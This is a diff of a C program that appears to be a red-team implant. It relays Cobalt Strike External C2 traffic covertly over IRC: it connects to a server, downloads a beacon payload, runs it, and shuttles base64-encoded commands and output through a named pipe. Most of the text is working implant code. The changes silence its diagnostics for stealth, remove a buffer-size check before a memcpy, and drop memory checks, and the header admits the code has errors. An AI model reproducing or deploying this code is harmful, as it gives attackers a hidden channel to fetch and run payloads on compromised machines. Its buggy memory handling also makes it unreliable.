@@ -1,9 +1,10 @@
 /**
  * TestClient.c
  * by Lt Daniel Fitzgerald
- * Jan 2020
+ * Red Flag 19-3 - July 2019
  *
  * Program to provide covert communications over IRC for Cobalt Strike using the External C2 feature.
+ * This was created as a fall back to get basic functionality in a short amount of developemnt time. It is not complete and has errors.
  * Instead of using cloakify to convert B64 messages to normal looking strings, it just sends the B64 message over IRC.
  *
  * Update 15 Jan 2020: Fixed the bug causing errors when transfering large ammounts of data.
@@ -87,7 +88,7 @@ SOCKET create_socket(char* ip, char* port)
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != 0) {
-		printf("WSAStartup failed with error: %d\n", iResult);
+		//printf("WSAStartup failed with error: %d\n", iResult);
 		return INVALID_SOCKET;
 	}
 
@@ -99,7 +100,7 @@ SOCKET create_socket(char* ip, char* port)
 	// Resolve the server address and port
 	iResult = getaddrinfo(ip, port, &hints, &result);
 	if (iResult != 0) {
-		printf("getaddrinfo failed: %d\n", iResult);
+		//printf("getaddrinfo failed: %d\n", iResult);
 		WSACleanup();
 		return INVALID_SOCKET;
 	}
@@ -110,7 +111,7 @@ SOCKET create_socket(char* ip, char* port)
 	// Create a SOCKET for connecting to server
 	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
 	if (ConnectSocket == INVALID_SOCKET) {
-		printf("Error at socket(): %ld\n", WSAGetLastError());
+		//printf("Error at socket(): %ld\n", WSAGetLastError());
 		freeaddrinfo(result);
 		WSACleanup();
 		return INVALID_SOCKET;
@@ -127,7 +128,7 @@ SOCKET create_socket(char* ip, char* port)
 	freeaddrinfo(result);
 
 	if (ConnectSocket == INVALID_SOCKET) {
-		printf("Unable to connect to server!\n");
+		//printf("Unable to connect to server!\n");
 		WSACleanup();
 		return INVALID_SOCKET;
 	}
@@ -168,7 +169,7 @@ int sendData(SOCKET sd, struct IRCinfo ircinfo, const char* data, DWORD len) {
 	char* buffer = (char*)malloc(len + 4);
 	if (buffer == NULL)
 	{
-		printf("Malloc failed..\n");
+		//printf("Malloc failed..\n");
 		return -1;
 	}
 	memset(buffer, 0, sizeof(len+4));
@@ -247,10 +248,6 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 	char recvbuff[MAX+1];
 	char* msgbuff = NULL;
 	BOOL msgcompleteflag = FALSE;
-	//char privDmExitMsg[64];
-	//sprintf(privDmExitMsg, "PRIVMSG %s :exit", ircinfo.NICK);
-	//char privChanExitMsg[64];
-	//sprintf(privChanExitMsg, "PRIVMSG #%s :exit", ircinfo.CHANNEL);
 	char privChanPING[64];
 	sprintf(privChanPING, "%s #%s :%s", ircinfo.privmsg, ircinfo.CHANNEL, ircinfo.ping);
 	int msgbuff_len = 0;
@@ -263,7 +260,6 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 		// Recv 4096 bytes
 		recv(sd, recvbuff, 4096, 0);
 		//printf("From Server : %s", recvbuff);
-		//printf("From server: REMOVED\n");
 		if (leftover != NULL)
 		{
 			buff = leftover;
@@ -290,7 +286,7 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 			msg_end = strstr(lenptr, "\r");
 			if (msg_end == NULL)
 			{
-				printf("End of msg not found, likely hit 4096 read limit. msg_end was NULL\n");
+				//printf("End of msg not found, likely hit 4096 read limit. msg_end was NULL\n");
 				leftover = msg_end;
 				break;
 			}
@@ -303,12 +299,12 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 			{
 				lenptr[len_len] = '\0';
 			}
-			printf("Encoded msg len:%s\n", lenptr);
+			//printf("Encoded msg len:%s\n", lenptr);
 			
 			// Convert to int
 			sscanf(lenptr, "%d", &msgbuff_len);
 			msgbuff_len += 1;
-			printf("As int +1: %d\n",msgbuff_len);
+			//printf("As int +1: %d\n",msgbuff_len);
 			// Malloc buffer to store incomming msg
 			msgbuff = (char*)malloc(msgbuff_len);
 			if (msgbuff == NULL)
@@ -322,7 +318,7 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 			// Iterate through every message in the IRC packet, there can be more than one
 			while (trafficptr != 0 && strlen(trafficptr) > 2)
 			{
-				printf("Encoded message recv\n");
+				//printf("Encoded message recv\n");
 				// Length of TRAFFIC_STR +1 for '-'
 				int traffic_str_len = strlen(ircinfo.TRAFFIC_STR);
 				trafficptr += (traffic_str_len + 1);
@@ -331,7 +327,7 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 				// printf("msg_end: %s\n", msg_end);
 				if (msg_end == NULL)
 				{
-					printf("End of msg not found, likely hit 4096 read limit. msg_end was NULL\n");
+					//printf("End of msg not found, likely hit 4096 read limit. msg_end was NULL\n");
 					leftover = msg_end;
 					break;
 				}
@@ -346,7 +342,7 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 				}
 				if (msg_end == 0)
 				{
-					printf("Error: msg_end was 0\n");
+					//printf("Error: msg_end was 0\n");
 					break;
 				}
 				else
@@ -390,7 +386,7 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 		strcat(pingstr, " :");
 		if (strstr(recvbuff, pingstr))
 		{
-			printf("PING! sending PONG.\n");
+			//printf("PING! sending PONG.\n");
 			char* pingsvr = strstr(recvbuff, pingstr);
 			pingsvr += strlen(pingstr);
 			sendargv(sd, "%s :%s\n", ircinfo.pong, pingsvr);
@@ -401,22 +397,14 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 			memcpy(buffer, nullbyte, 1);
 			return 1;
 		}
-		// result = exitcheck(sd, ircinfo, recvbuff)
-		// if (result == -1)
-		// {break;}
-		// Check if exit message in DM or channel
-		//if (strstr(recvbuff, privDmExitMsg) || strstr(recvbuff, privChanExitMsg))
-		//{
-		//	sendargv(sd, "PRIVMSG #%s :quitting\r\n", ircinfo.CHANNEL);
-		//	sendargv(sd, "QUIT :\r\n");
-		//}
+
 		// Check if ERROR message
 		if (strstr(recvbuff, "ERROR"))
 		{
-			printf("Server sent Error...\n");
+			//printf("Server sent Error...\n");
 			if (strstr(recvbuff, "Closing Link"))
 			{
-				printf("Error was to close link!\n");
+				//printf("Error was to close link!\n");
 			}
 			break;
 		}
@@ -431,16 +419,12 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 	// printf("Encoded msg:%s\n", msgbuff);
 	int unb64len;
 	char* decodedmsg = unbase64(msgbuff, msgbuff_len + 1, &unb64len);
-	printf("Msg len (pre): %d\n", size);
+
 	memcpy((char *)&size, decodedmsg, 4);
-	printf("Msg len: %d\n", size);
-	printf("msgbuff_len: %d\n", msgbuff_len);
-	printf("unb64len: %d\n", unb64len);
-	// Exit if size is incorrect
-	if (size < 0 || size > BUFFER_MAX_SIZE)
+	//printf("Msg len: %d\n", size);
+	// printf("unb64len: %d\n", unb64len);
+	if (size < 0)
 	{
-		printf("Error: size < 0 or size > BUFFER_MAX_SIZE\n");
-		free(msgbuff);
 		return -1;
 	}
 	memcpy(buffer, decodedmsg + 4, size);
@@ -518,7 +502,7 @@ void ircconnect(SOCKET sockfd, struct IRCinfo ircinfo)
 	{
 		memset(recvbuff, 0, sizeof(recvbuff));
 		recv(sockfd, recvbuff, sizeof(recvbuff), 0);
-		printf("From Server : %s", recvbuff);
+		//printf("From Server : %s", recvbuff);
 
 		if (recvbuff[strlen(recvbuff) - 1] == '\n')
 		{
@@ -526,7 +510,7 @@ void ircconnect(SOCKET sockfd, struct IRCinfo ircinfo)
 		}
 		if (strstr(recvbuff, "MODE "))
 		{
-			printf("Connection done?\n");
+			//printf("Connection done?\n");
 			break;
 		}
 		char pingstr[7];
@@ -534,7 +518,7 @@ void ircconnect(SOCKET sockfd, struct IRCinfo ircinfo)
 		strcat(pingstr, " :");
 		if (strstr(recvbuff, pingstr))
 		{
-			printf("PING! sending PONG.\n");
+			//printf("PING! sending PONG.\n");
 			char* pingsvr = strstr(recvbuff, pingstr);
 			pingsvr += strlen(pingstr);
 			sendargv(sockfd, "%s :%s\n", ircinfo.pong, pingsvr);
@@ -544,7 +528,7 @@ void ircconnect(SOCKET sockfd, struct IRCinfo ircinfo)
 	sendargv(sockfd, "%s %s\r\n", ircinfo.userhost, ircinfo.USER);
 	memset(recvbuff, 0, sizeof(recvbuff));
 	recv(sockfd, recvbuff, sizeof(recvbuff), 0);
-	printf("From Server : %s", recvbuff);
+	//printf("From Server : %s", recvbuff);
 }
 
 /**
@@ -594,16 +578,11 @@ void main(int argc, char* argv[])
 	// Set connection and IRC info
 	if (argc != 15)
 	{
-		printf("Incorrect number of args: %d\n", argc);
-		printf("Incorrect number of args: IRCexternalC2.exe [IP] [PORT] [NICK] [OP_NICK] [OP_PASS] [USER] [REALNAME] [CHANNEL] [TGTNICK] [SLEEP(ms)] [TRAFFIC_STR] [LEN_STR] [START_STR] [PIPE_STR]");
-		printf("Values should be no more than 49 bytes.\n");
+		//printf("Incorrect number of args: %d\n", argc);
+		//printf("Incorrect number of args: IRCexternalC2.exe [IP] [PORT] [NICK] [OP_NICK] [OP_PASS] [USER] [REALNAME] [CHANNEL] [TGTNICK] [SLEEP(ms)] [TRAFFIC_STR] [LEN_STR] [START_STR] [PIPE_STR]");
+		//printf("Values should be no more than 49 bytes.\n");
 		exit(1);
 	}
-
-	// Disable crash messages
-	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
-	// _set_abort_behavior(0,_WRITE_ABORT_MSG);
-
 	char* IP = argv[1];
 	char* PORT = argv[2];
 	struct IRCinfo ircinfo;
@@ -639,7 +618,7 @@ void main(int argc, char* argv[])
 	sockfd = create_socket(IP, PORT);
 	if (sockfd == INVALID_SOCKET)
 	{
-		printf("Socket creation error!\n");
+		//printf("Socket creation error!\n");
 		exit(1);
 	}
 
@@ -656,19 +635,13 @@ void main(int argc, char* argv[])
 
 	// Recv beacon payload
 	char * payload = (char *)malloc(PAYLOAD_MAX_SIZE);
-	if (payload == NULL)
-	{
-		printf("payload buffer malloc failed!\n");
-		exit(1);
-	}
 	DWORD payload_size = recvData(sockfd, ircinfo, payload, BUFFER_MAX_SIZE);
 	if (payload_size < 0)
 	{
-		printf("recvData error, exiting\n");
-		free(payload);
+		//printf("recvData error, exiting\n");
 		exit(1);
 	}
-	printf("Recv %d bytes from TS\n", payload_size);
+	//printf("Recv %d bytes from TS\n", payload_size);
 	// Start CS beacon
 	spawnBeacon(payload, payload_size);
 	// Loop unstil the pipe is up and ready to use
@@ -682,14 +655,13 @@ void main(int argc, char* argv[])
 		// Full string (i.e. "\\\\.\\pipe\\mIRC")
 		beaconPipe = connectBeaconPipe(pipestr);
 	}
-	printf("Connected to pipe!!\n");
+	//printf("Connected to pipe!!\n");
 
 	// Mudge used 1MB max in his example, test this
 	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
 	if (buffer == NULL)
 	{
-		printf("buffer malloc failed!\n");
-		free(payload);
+		//printf("buffer malloc failed!\n");
 		exit(1);
 	}
 
@@ -698,10 +670,10 @@ void main(int argc, char* argv[])
 		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
 		if (read_size < 0)
 		{
-			printf("read_frame error, exiting\n");
+			//printf("read_frame error, exiting\n");
 			break;
 		}
-		printf("Recv %d bytes from beacon\n", read_size);
+		//printf("Recv %d bytes from beacon\n", read_size);
 		// Sleep so we do not constantly send data if there is no change
 		if (read_size == 1)
 		{
@@ -711,21 +683,21 @@ void main(int argc, char* argv[])
 		int rv = sendData(sockfd, ircinfo, buffer, read_size);
 		if (rv == -1)
 		{
-			printf("sendData error, exiting..\n");
+			//printf("sendData error, exiting..\n");
 			break;
 		}
-		printf("Sent to TS\n");
+		//printf("Sent to TS\n");
 		
 		read_size = recvData(sockfd, ircinfo, buffer, BUFFER_MAX_SIZE);
 		if (read_size < 0)
 		{
-			printf("recvData error, exiting\n");
+			//printf("recvData error, exiting\n");
 			break;
 		}
-		printf("Recv %d bytes from TS\n", read_size);
+		//printf("Recv %d bytes from TS\n", read_size);
 
 		write_frame(beaconPipe, buffer, read_size);
-		printf("Sent to beacon\n");
+		//printf("Sent to beacon\n");
 	}
 	free(payload);
 	free(buffer);
